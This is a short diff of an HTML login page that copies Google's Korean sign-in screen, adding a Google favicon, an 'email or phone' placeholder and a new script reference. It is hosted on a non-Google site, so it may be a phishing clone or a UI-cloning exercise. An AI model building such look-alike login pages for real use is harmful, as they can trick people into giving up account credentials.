@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/static/Google Icon.png">
     <link rel="stylesheet" href="/static/login.css">
     <title>로그인 - Google 계정</title>
 </head>
@@ -18,7 +19,7 @@
             <form id="emailForm" method="GET" action="/templates/password.html">
 
                 <input id="email"
-                placeholder=""
+                placeholder="이메일 또는 휴대전화"
                 type="email"
                 pattern="[a-zA-Z0-9]+[@][a-zA-Z0-9]+[.]+[a-zA-Z]+[.]*[a-zA-Z]*"
                 autocomplete="off"
@@ -56,5 +57,5 @@
     </footer>
     
 </body>
-<script src="/static/login.js"></script>
+<script src="../static/script.js"></script>
 </html>
